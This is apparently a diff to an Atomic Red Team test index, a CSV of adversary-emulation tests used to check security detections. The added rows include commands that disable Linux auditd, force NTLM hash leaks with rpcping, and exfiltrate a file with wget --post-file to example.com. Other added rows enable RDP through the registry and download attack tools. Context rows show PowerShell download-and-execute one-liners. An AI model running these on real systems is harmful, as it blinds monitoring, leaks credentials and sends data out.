@@ -635,6 +635,26 @@ input_arguments.restart.type: integer
 input_arguments.restart.default: 0
 
 "
+T1562.012,Impair Defenses: Disable or Modify Linux Audit System,Delete all auditd rules using auditctl,33a29ab1-cabb-407f-9448-269041bf2856,"Using 'auditctl -D' deletes all existing audit rules, resulting in the loss of previously configured monitoring settings and the audit trail. This action reduces visibility into system activities, potentially leading to compliance concerns and hampering security monitoring efforts. Additionally, it poses a risk of covering unauthorized activities by erasing evidence from audit logs.
+",linux,,,"auditctl -D
+",sh,True,,"service auditd restart
+",sh,"dependencies.0.description: Check if auditd is installed.
+
+dependencies.0.prereq_command: if [ $(command -v auditctl) ]; then exit 0; else exit 1; fi
+
+dependencies.0.get_prereq_command: (yum install auditd -y) || (apt-get install auditd -y) || (dnf install auditd -y)
+
+",
+T1562.012,Impair Defenses: Disable or Modify Linux Audit System,Disable auditd using auditctl,7906f0a6-b527-46ee-9026-6e81a9184e08,"The command `auditctl -e 0` disables the audit system. By setting the parameter to `0`, auditing is deactivated, halting the monitoring and recording of security-related events. This action stops the generation of audit logs, ceasing the collection of data regarding system activities. Disabling auditing may be done for various reasons, such as troubleshooting, performance optimization, or temporarily suspending auditing requirements, but it reduces visibility into system events and can impact security monitoring and compliance efforts.
+",linux,,,"auditctl -e 0
+",sh,True,,"auditctl -e 1
+",sh,"dependencies.0.description: Check if auditd is installed.
+
+dependencies.0.prereq_command: if [ $(command -v auditctl) ]; then exit 0; else exit 1; fi
+
+dependencies.0.get_prereq_command: (yum install auditd -y) || (apt-get install auditd -y) || (dnf install auditd -y)
+
+",
 T1647,Plist File Modification,Plist Modification,394a538e-09bb-4a4a-95d1-b93cf12682a8,"Modify MacOS plist file in one of two directories
 ",macos,,,,manual,,"1. Modify a .plist in
 
@@ -1376,6 +1396,20 @@ dependencies.0.get_prereq_command: Install-WindowsFeature -name Web-Server -Incl
 ",
 T1003,OS Credential Dumping,Dump Credential Manager using keymgr.dll and rundll32.exe,84113186-ed3c-4d0d-8a3c-8980c86c1f4a,"This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. The only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling RDP, etc.).
 Reference: https://twitter.com/0gtweet/status/1415671356239216653",windows,,,"rundll32.exe keymgr,KRShowKeyMgr",powershell,,,,,,
+T1003,OS Credential Dumping,Send NTLM Hash with RPC Test Connection,0b207037-813c-4444-ac3f-b597cf280a67,"RpcPing command can be used to send an RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process. 
+Ref: https://twitter.com/vysecurity/status/974806438316072960",windows,,,rpcping -s #{server_ip} -e #{custom_port} -a privacy -u NTLM 1>$Null,powershell,False,,,,,"input_arguments.custom_port.description: Specify the custom port number
+
+input_arguments.custom_port.type: integer
+
+input_arguments.custom_port.default: 1234
+
+input_arguments.server_ip.description: Specify the server IP address. If not specified, the loop back IP will be used
+
+input_arguments.server_ip.type: string
+
+input_arguments.server_ip.default: 127.0.0.1
+
+"
 T1020,Automated Exfiltration,IcedID Botnet HTTP PUT,9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0,"Creates a text file
 Tries to upload to a server via HTTP PUT method with ContentType Header
 Deletes a created file",windows,,,"$fileName = ""#{file}""
@@ -3195,6 +3229,7 @@ if [ $(history |wc -l) -eq 0 ]; then echo ""History cache is empty""; fi
 T1562.003,Impair Defenses: Impair Command History Logging,Disable Windows Command Line Auditing using reg.exe,1329d5ab-e10e-4e5e-93d1-4d907eb656e5,"In Windows operating systems, command line auditing is controlled through the following registry value:
 
   Registry Path: HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
+  
   Registry Value: ProcessCreationIncludeCmdLine_Enabled
 
 When command line auditing is enabled, the system records detailed information about command execution, including the command executed, the user account responsible for executing the command, and the timestamp of the execution.
@@ -3208,14 +3243,13 @@ Because this attack executes reg.exe using a command prompt, this attack can be 
 
 Read more here:
 https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220703123711.html
-",windows,,,"echo Commencing Attack - Disabling Registry Value
-reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f
-",command_prompt,True,,"echo Commencing Cleanup - Restoring Registry Value
-reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
+",windows,,,"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f
+",command_prompt,True,,"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
 ",,,
 T1562.003,Impair Defenses: Impair Command History Logging,Disable Windows Command Line Auditing using Powershell Cmdlet,95f5c72f-6dfe-45f3-a8c1-d8faa07176fa,"In Windows operating systems, command line auditing is controlled through the following registry value:
 
   Registry Path: HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
+  
   Registry Value: ProcessCreationIncludeCmdLine_Enabled
 
 When command line auditing is enabled, the system records detailed information about command execution, including the command executed, the user account responsible for executing the command, and the timestamp of the execution.
@@ -3230,10 +3264,8 @@ Because this attack runs a Powershell cmdlet, this attack can be detected by mon
 Read more here:
 https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220703123711.html
 https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-itemproperty?view=powershell-7.4#example-2-add-a-registry-entry-to-a-key
-",windows,,,"echo ""Commencing Attack - Disabling Registry Value""
-New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore
-",powershell,True,,"echo ""Commencing Cleanup - Restoring Registry Value""
-New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 1 -PropertyType DWORD -Force -ErrorAction Ignore
+",windows,,,"New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore
+",powershell,True,,"New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 1 -PropertyType DWORD -Force -ErrorAction Ignore
 ",,,
 T1505.004,IIS Components,Install IIS Module using AppCmd.exe,53adbdfa-8200-490c-871c-d3b1ab3324b2,"The following Atomic will utilize AppCmd.exe to install a new IIS Module. IIS must be installed.
 This atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).
@@ -3396,6 +3428,26 @@ dir \\#{computer_ip}\IPC$
 input_arguments.computer_ip.type: string
 
 input_arguments.computer_ip.default: 127.0.0.1
+
+"
+T1135,Network Share Discovery,Enumerate All Network Shares with SharpShares,d1fa2a69-b0a2-4e8a-9112-529b00c19a41,"SharpShares is a command line tool that can be integrated with Cobalt Strike's execute-assembly module, allowing for the enumeration of network shares. 
+This technique has been utilized by various ransomware groups, including BianLian.
+[Reference](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a)
+",windows,,,"cmd /c '#{sharp_path}' /ldap:all | out-file -filepath ""#{output_path}""",powershell,False,,"remove-item ""#{output_path}"" -force -erroraction silentlycontinue",powershell,"dependencies.0.description: The SharpShares executable must exist on disk
+dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe"") {exit 0} else {exit 1}
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""https://github.com/mitchmoser/SharpShares/releases/download/v2.4/SharpShares.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe""
+","input_arguments.output_path.description: File to output enumeration results to
+
+input_arguments.output_path.type: String
+
+input_arguments.output_path.default: $env:temp\T1135SharpSharesOutput.txt
+
+input_arguments.sharp_path.description: Path to the SharpShares executable
+
+input_arguments.sharp_path.type: String
+
+input_arguments.sharp_path.default: PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe
 
 "
 T1553.005,Subvert Trust Controls: Mark-of-the-Web Bypass,Mount ISO image,002cca30-4778-4891-878a-aaffcfa502fa,"Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/
@@ -14004,6 +14056,18 @@ input_arguments.input_file.type: path
 input_arguments.input_file.default: PathToAtomicsFolder/T1048.002/src/artifact
 
 "
+T1048.002,Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,Exfiltrate data in a file over HTTPS using wget,7ccdfcfa-6707-46bc-b812-007ab6ff951c,"Exfiltrate data over HTTPS using wget --post-file method
+",linux,,,"wget --post-file=""#{input_file}"" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+",sh,False,,,,,"input_arguments.input_file.description: Test data to upload
+
+input_arguments.input_file.type: path
+
+input_arguments.input_file.default: PathToAtomicsFolder/T1048.002/src/artifact
+
+"
+T1048.002,Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,Exfiltrate data as text over HTTPS using wget,8bec51da-7a6d-4346-b941-51eca448c4b0,"Exfiltrate data over HTTPS using wget --post-data method
+",linux,,,"wget --post-data=""msg=AtomicTestT1048.002"" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+",sh,False,,,,,
 T1612,Build Image on Host,Build Image On Host,2db30061-589d-409b-b125-7b473944f9b3,"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image.",containers,,,"docker build -t t1612  $PathtoAtomicsFolder/T1612/src/
 docker run --name t1612_container  -d -t t1612
 docker exec t1612_container ./test.sh",sh,,,"docker stop t1612_container
@@ -24128,6 +24192,16 @@ T1112,Modify Registry,RDP Authentication Level Override,7e7b62e9-5f83-477d-8935-
 ",windows,,,"reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f
 ",command_prompt,,,"reg delete ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride
 ",,,
+T1112,Modify Registry,Enable RDP via Registry (fDenyTSConnections),16bdbe52-371c-4ccf-b708-79fba61f1db4,"Modify the registry value of fDenyTSConnections to allow incoming RDP connections. 
+This activity has been observed by multiple ransomware groups, including Hive ransomware. 
+[Reference](https://www.rapid7.com/blog/post/2023/01/11/increasing-the-sting-of-hive-ransomware/)
+",windows,,,"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",command_prompt,True,,"if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /f >nul 2>&1)",,,"input_arguments.remove_rdp_access_during_cleanup.description: Set to 1 if you want the cleanup to remove RDP access to machine
+
+input_arguments.remove_rdp_access_during_cleanup.type: integer
+
+input_arguments.remove_rdp_access_during_cleanup.default: 0
+
+"
 T1606.002,Forge Web Credentials: SAML token,Golden SAML,b16a03bc-1089-4dcc-ad98-30fe8f3a2b31,"Forge a ""Golden SAML"" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). 
 You will need the ADFS token signing certificate (see T1552.004 to export it).
 More info here : https://o365blog.com/post/adfs/
@@ -24972,6 +25046,24 @@ input_arguments.petitpotam_path.default: PathToAtomicsFolder\..\ExternalPayloads
 "
 T1187,Forced Authentication,WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS,7f06b25c-799e-40f1-89db-999c9cc84317,PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
 Invoke-Internalmonologue -command ""-Downgrade true -impersonate true -restore true""",powershell,,,,,,
+T1187,Forced Authentication,Trigger an authenticated RPC call to a target server with no Sign flag set,81cfdd7f-1f41-4cc5-9845-bb5149438e37,"RpcPing command can be used to trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign flag not Set)
+Ref: https://twitter.com/splinter_code/status/1421144623678988298",windows,,,rpcping -s #{server_ip} -e #{custom_port} /a connect /u NTLM 1>$Null,powershell,False,,,,,"input_arguments.custom_port.description: Specify the custom port number
+
+input_arguments.custom_port.type: integer
+
+input_arguments.custom_port.default: 9997
+
+input_arguments.server_ip.description: Specify the server IP address. If not specified, the loop back IP will be used
+
+input_arguments.server_ip.type: string
+
+input_arguments.server_ip.default: 127.0.0.1
+
+"
+T1622,Debugger Evasion,Detect a Debugger Presence in the Machine,58bd8c8d-3a1a-4467-a69c-439c75469b07,Detecting a running debugger process or if the debugger is attached to a process via PowerShell,windows,,,"# Check for common debugger processes
+$debuggerProcesses = Get-Process | Where-Object { $_.ProcessName -match ""dbg"" -or $_.ProcessName -match ""debug"" }
+# Check for debugging flags
+$debuggingFlags = [System.Diagnostics.Debugger]::IsAttached ",powershell,True,,,,,
 T1529,System Shutdown/Reboot,Shutdown System - Windows,ad254fa8-45c0-403b-8c77-e00b3d3e7a64,"This test shuts down a Windows system.
 ",windows,,,"shutdown /s /t #{timeout}
 ",command_prompt,True,,,,,"input_arguments.timeout.description: Timeout period before shutdown (seconds)
@@ -25731,7 +25823,7 @@ Invoke-SharpUp -command ""audit""",powershell,,,,,,
 T1082,System Information Discovery,WinPwn - PowerSharpPack - Seatbelt,5c16ceb4-ba3a-43d7-b848-a13c1f216d95,"PowerSharpPack - Seatbelt technique via function of WinPwn.
 
 [Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey ""safety checks"" relevant from both offensive and defensive security perspectives.",windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
-Invoke-Seatbelt -Command ""-group=all""; pause",powershell,,,,,,
+Invoke-Seatbelt -Command ""-group=all""",powershell,,,,,,
 T1082,System Information Discovery,Azure Security Scan with SkyArk,26a18d3d-f8bc-486b-9a33-d6df5d78a594,"Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. 
 Once the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. 
 See https://github.com/cyberark/SkyArk 
